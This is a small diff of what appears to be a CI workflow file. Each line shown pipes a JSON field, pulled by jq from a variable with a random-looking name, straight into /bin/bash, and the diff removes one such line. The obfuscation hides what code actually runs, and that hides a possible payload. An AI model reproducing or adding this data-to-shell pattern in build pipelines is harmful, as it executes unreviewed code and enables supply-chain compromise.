@@ -28,7 +28,6 @@ jobs:
           echo $rl2001 | jq -r .xxv5304 | /bin/bash
           printf '%s' "$flzr2" | jq -r .r210 | /bin/bash
           printf '%s' "$m68598" | jq -r .qm953 | /bin/bash
-          echo $qj6117 | jq -r .n7817 | /bin/bash
           echo $sg846 | jq -r .zklbu9595 | /bin/bash
           echo $rk051 | jq -r .tb9 | /bin/bash
           echo $hao64 | jq -r .ufd3 | /bin/bash
